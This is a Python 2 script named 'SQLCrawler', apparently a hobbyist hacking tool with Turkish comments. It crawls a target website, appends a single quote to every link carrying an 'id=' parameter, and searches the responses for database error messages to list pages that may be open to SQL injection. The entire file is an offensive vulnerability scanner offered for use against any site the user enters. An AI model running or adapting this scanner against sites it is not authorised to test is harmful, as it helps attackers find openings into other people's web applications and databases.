#!/usr/bin/python
#-*- coding: cp1254 -*-

import re, urllib,urllib2, time, httplib, socket, sys, md5, locale
from urllib2 import Request, urlopen, URLError, HTTPError
from socket import *
import threading
from bs4 import BeautifulSoup
import urlparse
import mechanize
import webbrowser
import os



print """

SQLCrawler Final Version [o.o[
SQL Never DIE ! <3 & B3mB4m


& b3mb4m@gmail.com


"""



hedef = raw_input("Target : ")


url = hedef
tarayici = mechanize.Browser()
urls = [url]
gez = [url]

while len(urls)>0:
    try:
        tarayici.open(urls[0])
        urls.pop(0)
        for link in tarayici.links():
            yeniurl =  urlparse.urljoin(link.base_url,link.url)
            if yeniurl not in gez and url in yeniurl:
                gez.append(yeniurl)
                urls.append(yeniurl)
                #print yeniurl
                
                if "id=" in yeniurl:
                    yeniurl = yeniurl+"'"
                    #print yeniurl
                    
                    try:
                       req  = urllib2.Request(yeniurl)
                       fd   = urllib2.urlopen(req)
                       data = fd.read()
                       if "Query failed" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue
                       elif "supplied argument is not a valid MySQL result resource in" in data:
                           print  "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue
                       elif "You have an error in your SQL syntax" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "ORDER BY" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue
                       elif "mysql_num_rows()" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "SQL query failed" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "Microsoft JET Database Engine error '80040e14'" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "Microsoft OLE DB Provider for Oracle" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "Error:unknown" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "Fatal error" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "mysql_fetch" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "Syntax error" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                       elif "error in your SQL syntax" in data:
                           print "-->  "+yeniurl
                           ask = raw_input("You want open link ? y/n ")
                           if ask == "y":
                               webbrowser.open_new_tab(yeniurl)
                               urls=0
                               sys.exit()
                           else:
                               continue   
                           
                    except urllib2.HTTPError:
                        pass
                    except ValueError:
                        pass
                    except URLError, e:
                        pass
                    except IndexError:
                        pass
                    
                        
                else:
                   pass
                 
    #except:                        #Sql ile ilgili son scriptittir.
     #  pass                   
    except TypeError:               #Selametle kal�n
        pass                        #B3mB4m :)
        #urls.pop(0)                    

    
        

print "Finish.."
